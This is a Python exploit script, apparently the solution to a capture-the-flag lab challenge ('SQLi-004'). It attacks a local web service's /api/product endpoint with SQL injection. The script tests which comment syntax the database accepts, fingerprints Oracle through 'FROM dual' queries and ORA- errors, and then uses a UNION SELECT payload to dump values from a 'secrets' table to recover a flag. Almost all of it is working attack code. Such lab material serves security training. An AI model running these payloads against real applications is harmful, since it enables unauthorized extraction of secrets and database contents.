#!/usr/bin/env python3
"""
SQLi-004 Exploit Script  
Comment-based SQL Injection Detection and Flag Extraction (Oracle)
"""

import requests
import sys
import re

TARGET = "http://localhost:5004"

def test_comments():
    """Test for comment-based SQL Injection"""
    print("[*] Testing for Comment-based SQL Injection...")
    
    # Test -- comment
    r1 = requests.get(f"{TARGET}/api/product", params={"id": "1--"})
    dash_works = "success" in r1.text and "name" in r1.text
    
    # Test # comment (should NOT work in Oracle)
    r2 = requests.get(f"{TARGET}/api/product", params={"id": "1#"})
    hash_works = "success" in r2.text and "name" in r2.text
    
    # Test /* */ comment
    r3 = requests.get(f"{TARGET}/api/product", params={"id": "1/*comment*/"})
    block_works = "success" in r3.text
    
    print(f"    -- comment works: {dash_works}")
    print(f"    # comment works: {hash_works}")  
    print(f"    /* */ comment works: {block_works}")
    
    if dash_works and not hash_works:
        print("[+] VULNERABLE! Comment-based SQLi confirmed")
        print("[+] # not working indicates Oracle/MSSQL/PostgreSQL")
        return True
    
    return dash_works or block_works

def confirm_oracle():
    """Confirm Oracle database"""
    print("\n[*] Confirming Oracle database...")
    
    # Oracle requires FROM dual
    payload = "1 AND 1=(SELECT 1 FROM dual)--"
    r = requests.get(f"{TARGET}/api/product", params={"id": payload})
    
    if "success" in r.text:
        print("[+] Oracle confirmed (FROM dual works)")
        return True
    
    # Check error pattern
    payload = "1'"
    r = requests.get(f"{TARGET}/api/product", params={"id": payload})
    if "ORA-" in r.text:
        print("[+] Oracle confirmed (ORA- error pattern)")
        return True
    
    return False

def extract_flag():
    """Extract flag using UNION injection"""
    print("\n[*] Extracting flag...")
    
    payload = "0 UNION SELECT 1,secret_value,secret_name,4,'ctf','FLAG',0 FROM secrets--"
    r = requests.get(f"{TARGET}/api/product", params={"id": payload})
    
    flag_match = re.search(r'FLAG\{[^}]+\}', r.text)
    if flag_match:
        return flag_match.group(0)
    
    return None

def main():
    print("=" * 60)
    print("SQLi-004 Exploit - Comment-based Detection (Oracle)")
    print("=" * 60)
    
    if not test_comments():
        print("[-] Could not confirm vulnerability")
        sys.exit(1)
    
    confirm_oracle()
    
    flag = extract_flag()
    if flag:
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        print("\n[-] Could not extract flag automatically")
        print("[*] Try manual UNION SELECT with Oracle syntax")

if __name__ == "__main__":
    main()
